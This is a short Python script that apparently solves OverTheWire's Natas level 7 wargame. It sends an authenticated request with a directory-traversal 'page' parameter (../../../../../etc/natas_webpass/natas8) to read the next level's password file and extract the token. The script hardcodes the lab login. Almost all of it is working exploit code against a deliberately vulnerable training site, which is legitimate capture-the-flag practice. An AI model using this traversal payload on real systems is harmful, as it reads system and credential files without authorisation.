import requests
import re

url = "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8"
user = "natas7"
password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"

r = requests.post(url, auth=(user, password))

result = re.findall(r"\b\w{32}\b", r.text)[1]

print(result)
